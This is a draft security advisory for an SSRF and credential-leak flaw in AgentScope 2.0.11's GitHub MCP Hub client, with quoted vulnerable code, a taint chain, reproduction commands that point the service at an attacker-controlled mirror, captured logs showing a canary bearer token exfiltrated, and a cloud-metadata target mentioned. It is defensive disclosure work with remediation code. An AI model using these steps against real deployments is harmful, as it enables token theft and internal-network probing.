# AgentScope — SSRF and Deployment-Token Exfiltration in `GitHubMCPHub._request()`

![CVE](https://img.shields.io/badge/CVE-PENDING-lightgrey)
![CVSS](https://img.shields.io/badge/CVSS_3.1-9.1_Critical-red)
![CWE](https://img.shields.io/badge/CWE--918-SSRF-orange)
![CWE](https://img.shields.io/badge/CWE--522-Credentials_Sent_to_Unintended_Host-orange)
![Status](https://img.shields.io/badge/status-draft-yellow)

> **Summary** — AgentScope's GitHub MCP Registry client builds its outbound
> request by string-concatenating a caller-supplied `base_url` with a
> caller-supplied `path` and passing caller-supplied `params` straight to
> `httpx`, with no target validation — and it attaches
> `Authorization: Bearer <api_token>` to that request regardless of which host
> `base_url` names. A deployment whose registry address can be influenced
> therefore sends the configured GitHub token, in full, to a host the token was
> never meant for. Measured on an unmodified AgentScope **2.0.11** Agent
> Service: the receiving host logged `Authorization: Bearer ghp_CANARY_REDACTED_TOKEN`
> (CWE-522), the injected `cursor`/`card_id` values appeared verbatim in the
> request line (parameter injection), a private-network address was reached
> (SSRF), and the GET still left the server with no token configured (pure SSRF).

Internal tracking ID: `AS-2026-006`.

<!--
  STATUS — 2026-11-18: draft. No CVE ID requested yet and the vendor has not
  been contacted. Update the badges, the Metadata "Status" row, the Timeline and
  the "Disclosure" section as soon as you file the report, and do not claim a
  submission happened before it did.
-->

## Metadata

| Field | Value |
|---|---|
| Vendor | AgentScope (`agentscope-ai`) |
| Product | AgentScope — Agent Service / MCP Hub (`agentscope` PyPI package) |
| Repository | https://github.com/agentscope-ai/agentscope |
| Component | `src/agentscope/app/hub/_mcp/_github_hub.py` — `GitHubMCPHub._request()` |
| Affected version | `2.0.11` (PyPI, released 2026-10-27) — **confirmed affected**, code path below |
| Not tested | `2.0.12` (released 2026-11-16) and `main`; the same construction is documented as the supported way to point the hub at a self-hosted registry, so re-check before assuming it is fixed |
| Vulnerability class | CWE-918 (Server-Side Request Forgery), CWE-522 (Insufficiently Protected Credentials) |
| CVSS 3.1 (recommended) | **9.1 Critical** — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:L` |
| CVSS 3.1 (base_url pinned) | 6.3 Medium — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L` |
| Status | Draft — no CVE ID requested yet |
| Reporter | gaoxihan (<https://github.com/taalsa>) |

## Summary

AgentScope ships an **Agent Service** (a FastAPI backend) whose *MCP Hub*
feature lets users browse and install MCP servers from a registry.
`GitHubMCPHub` is the shipped implementation for the
[GitHub MCP Registry](https://github.com/mcp) and is registered with
`create_app(...)` as a documented assembly item. Its constructor exposes two
documented parameters:

```python
hub = GitHubMCPHub(
    base_url="https://api.mcp.github.com",  # the registry to talk to
    api_token="ghp_...",                    # optional: raises the rate limit
)
```

The documentation presents this as the normal way to run a **self-hosted or
GitHub Enterprise registry mirror** — the whole point of `base_url` is that an
operator can point it somewhere other than the official host.

`_request()` then does this:

```python
headers = {"Accept": "application/json"}
if self.api_token:
    headers["Authorization"] = f"Bearer {self.api_token}"   # (1) credential
...
response = await self._client.get(
    f"{self.base_url}{path}",   # (2) sink: unvalidated concatenation
    params=params,
    headers=headers,
)
```

Three things are missing, and none of them is a policy question:

1. **No destination check.** Nothing compares `base_url` (or the host the
   request resolves to) against an allow-list, and nothing rejects
   private/reserved ranges. `httpx` connects wherever the string says.
2. **The credential is not bound to the destination.** The `Bearer` header is
   attached whenever `api_token` is set, on every host, with no
   "is this the official registry?" test. So the moment (1) is satisfied by an
   attacker, the token rides along automatically — that is CWE-522, not a
   side effect of SSRF.
3. **`path` and `params` are not validated.** They come from the REST layer
   (`q`, `cursor`, `limit`, `card_id`) and reach the wire as-is, so the request
   line and query string are partly attacker-authored even when the host is
   fixed.

Redirects are not the escape hatch here — `base_url` itself is the redirect.
The root cause is an API client that treats its own configuration as a trusted
input and the caller's data as part of the URL.

## Root cause

Sink, in the audited 2.0.11 snapshot (line numbers shift a few lines across
builds; the quoted statements are the anchor):

```python
class GitHubMCPHub(MCPHubBase):                                   # L102

    def __init__(
        self,
        hub_id: str = "github",
        ...
        base_url: str = DEFAULT_BASE_URL,                         # L118  taint source
        api_token: str | None = None,                             # L119  taint source
        timeout: float = 30.0,
    ) -> None:
        ...
        self.base_url = base_url.rstrip("/")                      # L142  no validation
        self.api_token = api_token                                # L143

    async def _request(self, path: str, params: dict | None = None) -> "httpx.Response":
        import httpx
        headers = {"Accept": "application/json"}
        if self.api_token:
            headers["Authorization"] = f"Bearer {self.api_token}"  # L189-190  credential
        if self._client is None:
            self._client = httpx.AsyncClient(timeout=self.timeout)
        response = await self._client.get(
            f"{self.base_url}{path}",                              # L196-200  SINK
            params=params,
            headers=headers,
        )
        if response.status_code >= 400:
            raise HubError(self._hub_id, response.status_code, response.text)
        return response
```

**Taint chain**

```
base_url / api_token      (constructor, hub factory, deployment config)
        +
path / params             (REST request: /hub/mcp/{hub_id}/cards?q=&cursor=&limit=,
                           /hub/mcp/{hub_id}/cards/{card_id})
        ↓
f"{self.base_url}{path}" + params + Authorization: Bearer <api_token>
        ↓
httpx GET to an arbitrary host, with the deployment credential attached
```

Every public method of the hub (`list_mcps()`, `get_mcp()`, and the install
flow that reads them) funnels through `_request()`, so the sink is not a
corner case — it is the only outbound path the component has.

![Sink](screenshots/01-sink-github-hub-request.png)

*Figure 1 — the sink. `L189-190` attaches the bearer token; `L196-200`
concatenates `base_url` with the caller's `path` and hands both to `httpx`.*

![Taint source](screenshots/02-taint-source-constructor.png)

*Figure 2 — `__init__`. `base_url` and `api_token` are documented constructor
parameters, stored with no validation (`L142-143`).*

## Who can influence `base_url` (prerequisites, stated plainly)

This is not a claim that a remote attacker types `base_url` into the chat box.
The defect is that the client has **no boundary between "the registry address"
and "the credential that belongs to it"**, so every channel that can affect the
address becomes a full-impact path, while the address-free channel still yields
SSRF-with-attacker-authored-request-line behaviour. Concretely:

| Channel | What it gives an attacker | Score |
|---|---|---|
| Deployment config / env var / admin UI that sets the registry or Enterprise mirror URL (the documented use of `base_url`) | arbitrary destination **+ the bearer token** | 9.1 |
| A hub factory / plugin / multi-tenant wrapper that builds `GitHubMCPHub` from user-supplied or tenant-supplied settings (the framework's own extension point) | as above | 9.1 |
| Content the agent is asked to process, where the application lets it select or override a hub (indirect prompt-injection style "use this registry" flows) | as above, per deployment | 9.1 |
| Only `path` / `params` reachable through the REST API, `base_url` hard-pinned to the official registry | attacker-authored query string and path segment against the registry endpoint, hub browse abuse, information probing | 6.3 |

The first three rows are why the recommended rating is the Critical one: the
component is *designed* to accept a non-official `base_url`, and it does not
adapt its credential handling to that fact. There is no switch, no warning, and
no allow-list to turn on.

## Attack chain

![Chain](screenshots/04-attack-chain.png)

*Figure 3 — the chain used in the test: the exploit talks only to the product's
own documented REST API of an **unmodified** Agent Service; the sink is reached
in-process, no test endpoint or patched code is involved.*

```
attacker registry mirror  (base_url)
        ↑
GET /hub/mcp/github/cards?q=markdown&cursor=<attacker>&limit=7
        ↓
Agent Service (unmodified) → GitHubMCPHub._request()
        ↓
httpx GET  f"{base_url}{path}"  +  Authorization: Bearer <deployment token>
        ↓
mirror receives the complete token, the injected cursor, the injected card_id
```

Four effects, all measured:

| # | Effect | Evidence |
|---|---|---|
| 1 | **Credential exfiltration** — the deployment's `api_token` arrives at the attacker host as `Authorization: Bearer ghp_CANARY_REDACTED_TOKEN` | `EFFECT1_TOKEN_EXFIL = True` |
| 2 | **Intranet SSRF** — with `base_url` set to a private address, the *server* issues the GET into that network | `EFFECT2_INTRANET_SSRF = True` |
| 3 | **Parameter injection** — `cursor=CURSOR-INJECTED-BY-ATTACKER` appears verbatim in the captured query string; `card_id` is interpolated into the path | `EFFECT3_PARAM_INJECTION = True` |
| 4 | **Pure SSRF (control)** — with no token configured the GET is still issued, with no `Authorization` header | `EFFECT4_PURE_SSRF_NO_TOKEN = True` |
| 5 | Cloud metadata (`169.254.169.254`) reachable through the same chain | **[Likely]** — not tested; `_request()` validates no target address, so `httpx` will connect to any IP. A local private-address probe stands in for it. |

## Impact

**With `base_url` influence (the documented configuration surface):**

- **The GitHub token is disclosed in full** to a host the operator never
  intended. A `ghp_`/`github_pat_` token that was configured only to raise the
  registry rate limit becomes usable by the attacker: read access to whatever
  the token scopes allow (private repositories included), code tampering,
  quota abuse and billing impact, and — because the request looks like it came
  from the product's own client (`python-httpx/0.28.1`) — the theft is hard to
  attribute.
- **Pivot into the private network.** The service issues attacker-chosen
  requests to RFC1918 / link-local addresses, so an externally reachable Agent
  Service becomes a probe and a relay for internal services that were never
  published. Cloud metadata is on the same path (`[Likely]`).
- **The hub browse/install UI is fed attacker data.** Whatever the mirror
  returns is parsed by the hub and rendered as installable entries, so the same
  primitive also seeds a malicious MCP-server catalog into users' pools — the
  install templates are the next hop (see the `{VAR}` substitution surface in
  `_github_hub.py`, noted under Remediation P2).

**Without token involvement (effect 4) and in the pinned-`base_url` case:**
SSRF still holds, and `path`/`params` injection still lets a caller shape the
outbound request line; impact drops to Registry-query abuse and probing
(6.3 Medium).

Confidentiality is the primary loss (`C:H`: the credential is disclosed
wholesale). Integrity and availability are `L`: the attacker-chosen endpoint
answers the hub's own read APIs and can steer what the UI presents, while a
slow or dead destination stalls the request path (the 30 s client timeout is the
only bound).

## Reproduction

### A. Self-contained (no AgentScope install needed) — start here

`poc/exp_logic.py` re-executes the vulnerable construction exactly as it appears
in `_github_hub.py` (same URL concatenation, same unconditional bearer
attachment, same `params` pass-through) against a local capture endpoint, so a
reviewer can confirm the behaviour with one command:

```bash
python poc/exp_logic.py
```

Expected output (excerpt of a run on this repository; the complete transcript,
including timestamps, is
[`evidence/exp_logic_run.log`](evidence/exp_logic_run.log)):

```text
== REGISTRY MIRROR (attacker-controlled —— captured Token exfiltration) ==
GET /v0/servers?limit=7&q=markdown&cursor=CURSOR-INJECTED-BY-ATTACKER AUTH=Bearer ghp_CANARY_REDACTED_TOKEN
GET /v0/servers/CARD-ID-INJECTED-BY-ATTACKER AUTH=Bearer ghp_CANARY_REDACTED_TOKEN

[VERDICT] EFFECT1_TOKEN_EXFIL = True (Bearer ghp_CANARY_REDACTED_TOKEN)
[VERDICT] EFFECT3_PARAM_INJECTION = True
[VERDICT] EFFECT2_INTRANET_SSRF = True
[VERDICT] EFFECT4_PURE_SSRF_NO_TOKEN = True (GET issued, no Authorization header)
[VERDICT] EXP_SUCCESS = True
```

`httpx` is used when installed; otherwise the script falls back to `urllib` with
the same URL/header construction. Both branches demonstrate the defect, which
lives in how the request is assembled, not in the HTTP library.

### B. Against an unmodified AgentScope Agent Service

```bash
pip install "agentscope[service]"        # tested: 2.0.11

# one command: starts the service, runs both chains, tears everything down
python poc/exp_github_hub.py --auto
```

or, explicitly, two terminals:

```bash
# 1 — unmodified service, hub pointed at the attacker mirror, token set
REAL_PORT=8001 REAL_HUB_BASE=http://127.0.0.1:18721 \
REAL_HUB_TOKEN=ghp_CANARY_REDACTED_TOKEN python poc/deploy_real.py

# 2 — exploit + capture
python poc/exp_github_hub.py --target http://127.0.0.1:8001 \
        --intranet-target http://127.0.0.1:8002
```

`deploy_real.py` uses only the documented assembly point (`GitHubMCPHub` in the
`mcp_hubs` list passed to `create_app`) and only documented constructor
parameters — it does not patch, monkey-patch or instrument the product. It prints
the hub-assembly parameter names it found on the installed build, because those
names have moved across 2.0.x releases; adjust one line if your build differs.
`exp_github_hub.py` discovers the hub routes from the service's own
`/openapi.json` rather than hardcoding them.

A `500` from the hub endpoints is expected and is not a failure: the mirror is
not a real registry document, but the outbound request — with the token — has
already been sent and captured by then. That is what the evidence lines show.

The transcript of the original audit run against the unmodified 2.0.11 service
is kept at [`evidence/exp_real_api.log`](evidence/exp_real_api.log) (its labels
are the Chinese ones printed in Figures 4-6); the English transcripts of the
re-runs shipped with this repository are in
[`evidence/exp_logic_run.log`](evidence/exp_logic_run.log).

![Attack request](screenshots/03-attack-request-real-rest-api.png)

*Figure 4 — the attack requests against the unmodified service's official REST
API (`GET /hub/mcp`, `/hub/mcp/github/cards`, `/hub/mcp/github/cards/{card_id}`).
No `/fuzz/probe`, no modified build.*

![Full run](screenshots/05-full-run-output.png)

*Figure 5 — full transcript of the real-deployment run: mirror captures the
bearer token and the injected `cursor`; the private-address probe captures the
server's GET with no `Authorization` header (control).*

![Evidence](screenshots/06-four-effects-evidence.png)

*Figure 6 — the four verdicts from the real-deployment run, plus
`EXP_SUCCESS = True`.*

### C. Scoring

```bash
python poc/cvss_calc.py
```

Prints the three vectors below, computed with the FIRST v3.1 formula.

## CVSS

| Scenario | Vector | Score |
|---|---|---|
| **Recommended: `base_url` influence + token exfiltration** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:L` | **9.1 Critical** |
| Upper bound, unauthenticated caller (`PR:N`) | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L` | 9.9 Critical |
| `base_url` hard-pinned to the official registry, only `path`/`params` reachable | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L` | 6.3 Medium |

Rationale for the recommended row: `AV:N/AC:L` — the service is a network
backend and the sink is unconditional; `PR:L` — reaching the hub routes needs a
service account, not an administrator; `UI:N`; `S:C` — the request leaves the
component's scope and reaches an arbitrary host chosen through its
configuration; `C:H` — the deployment credential is disclosed in full; `I:L` —
the attacker-chosen endpoint answers the hub's read APIs and can steer the
install catalog; `A:L` — a slow or dead destination stalls the hub path within
the 30 s timeout.

State 9.1 for the `base_url`-influence case. Use 6.3 only where the deployment
genuinely pins `base_url` — and note that the component's documentation
encourages the opposite.

## Why this is not intended behaviour

- **The token is documented as a rate-limit convenience, not as something to
  broadcast.** The docstring says the registry "is public; a token only raises
  the rate limit". Attaching it to *any* host is not a feature of that design;
  it is an omission.
- **There is no switch and no warning.** `_request()` reads no allow-list, has
  no host check, and emits no warning when a token is configured alongside a
  non-default `base_url`. The behaviour is unconditional.
- **The fix belongs in the client, not in every deployment.** Requiring each
  operator to keep `base_url` and `api_token` consistent by hand is a
  configuration-discipline argument; binding a credential to the host it belongs
  to is the ordinary expectation (browsers scope cookies per origin, and OAuth
  / SDK clients are configured host-by-host).
- **The SSRF half does not depend on configuration at all.** Effect 4 shows the
  request leaves with no token involved, and `path`/`params` are attacker data
  even in the pinned case — so the destination-validation gap is a defect in the
  component regardless of how `base_url` got its value.
- **The install-template surface is a second-order risk on the same chain.**
  Whatever the attacker-chosen registry returns is parsed and turned into
  install commands (`_substitute`, `{VAR}` replacement), so trusting the
  destination also trusts its content.

## Remediation

**P0 — bind the credential to the destination (the actual fix).**

```python
ALLOWED_REGISTRY_HOSTS = {"api.mcp.github.com"}   # plus an explicit operator opt-in list

def _request(self, path, params=None):
    target = httpx.URL(self.base_url)
    if target.host not in ALLOWED_REGISTRY_HOSTS | set(self.allowed_hosts):
        raise HubError(self._hub_id, "untrusted registry host", "")
    headers = {"Accept": "application/json"}
    if self.api_token and target.host == "api.mcp.github.com":
        headers["Authorization"] = f"Bearer {self.api_token}"
    ...
```

If a self-hosted mirror is a supported deployment, then the token must be
scoped to it explicitly (per-host credential), never applied to "whatever
`base_url` says". Also reject private / link-local / loopback destinations by
default for a public registry client, and resolve-then-check to close the
DNS-rebinding gap.

**P1 — validate what the caller supplies.**

```python
_PATH_RE = re.compile(r"^/[A-Za-z0-9._\-/]*$")
if not _PATH_RE.match(path) or ".." in path.split("/"):
    raise HubError(...)
```

Bound `params` values (length, character set), URL-encode path segments
(`card_id`) instead of interpolating them, and set
`follow_redirects=False` so a 302 cannot leave the allow-list.

**P2 — defence in depth.** Route outbound hub traffic through a single audited
egress proxy with rate limits; use short-lived, least-privilege tokens; validate
the registry response against a schema before it reaches
`_substitute`/install-template generation, so a hostile mirror cannot inject
commands.

**Workaround for operators today.** Pin `base_url` to
`https://api.mcp.github.com` in your own assembly code and do not pass
`api_token` at all unless the registry rate limit is actually a problem — the
registry is documented as working anonymously. Treat any configuration path that
lets a lower-privileged party set the registry URL as privileged.

## Verification status

| Item | Status |
|---|---|
| Sink and credential attachment read from source at 2.0.11 | **Verified** (Figures 1-2) |
| Token exfiltration to an attacker-chosen host | **Verified** (mirror logged the full `Bearer` value; Figures 5-6) |
| SSRF to a private-network address | **Verified** (probe logged the server's GET; UA `python-httpx/0.28.1`) |
| `cursor` / `card_id` injection reaching the wire | **Verified** (captured request lines) |
| SSRF with no token configured (control) | **Verified** (`AUTH=(none)`, GET still issued) |
| Exploit runs against an **unmodified** service via documented REST API | **Verified** (Figure 4) |
| Cloud metadata `169.254.169.254` reachable | **Not tested** — same chain, `[Likely]`; do not state as fact |
| `2.0.12` / `main` still affected | **Not tested** — re-verify before filing |
| Vendor notified | **No** |

Only the rows marked **Verified** should be stated as tested fact in a CVE
description. The `[Likely]` and "not tested" rows must stay hedged.

## Disclosure

All testing was performed on self-owned services on a local network: the
"attacker mirror" and the "intranet probe" were capture servers written for this
test, bound to loopback and to a private lab address, and the token used was a
canary value (`ghp_CANARY_REDACTED_TOKEN`). No third-party system, and no real
GitHub credential, was involved. Private addresses in the screenshots and logs
are masked (`172.16.x.x`).

## Timeline

| Date | Event |
|---|---|
| 2026-10-27 | AgentScope 2.0.11 published on PyPI (the audited version) |
| 2026-11-18 | Code audit; four effects reproduced against an unmodified local Agent Service |
| 2026-11-18 | Advisory drafted at this repository; **no CVE ID requested yet, vendor not yet contacted** |

## References

- AgentScope repository — https://github.com/agentscope-ai/agentscope
- AgentScope on PyPI (2.0.11 released 2026-10-27) — https://pypi.org/project/agentscope/
- MCP Hub documentation (`GitHubMCPHub`, `base_url`, `api_token`) — https://docs.agentscope.io/latest/en/deploy/hub/mcp-hub
- Hub overview (assembly via `create_app`) — https://docs.agentscope.io/latest/en/deploy/hub/overview
- GitHub MCP Registry — https://github.com/mcp
- CWE-918 Server-Side Request Forgery — https://cwe.mitre.org/data/definitions/918.html
- CWE-522 Insufficiently Protected Credentials — https://cwe.mitre.org/data/definitions/522.html
- CVSS v3.1 specification — https://www.first.org/cvss/specification-document

## Credits

Discovered, audited and reported by **gaoxihan** (<https://github.com/taalsa>).
